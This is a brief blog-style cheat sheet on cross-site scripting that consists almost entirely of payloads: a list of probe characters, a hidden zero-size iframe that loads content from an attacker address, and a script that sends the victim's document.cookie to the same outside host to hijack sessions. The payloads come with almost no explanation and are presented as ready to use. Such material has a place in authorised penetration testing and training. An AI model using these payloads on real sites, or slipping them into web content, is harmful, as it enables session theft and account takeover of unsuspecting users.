---
layout: post
title:  "webapp - xss"
date:   2022-01-01
categories: web
---


### Identifying XSS Vulnerabilities

```js
< > ' " { } ;\
```

## Content Injection

```html
<iframe src=http://10.10.10.10/exploit height=”0” width=”0”></iframe>
```

### Stealing Cookies and Session Information

```js
<script>new Image().src="http://10.10.10.10/hijacked.jpg?output="+document.cookie;</script>
```
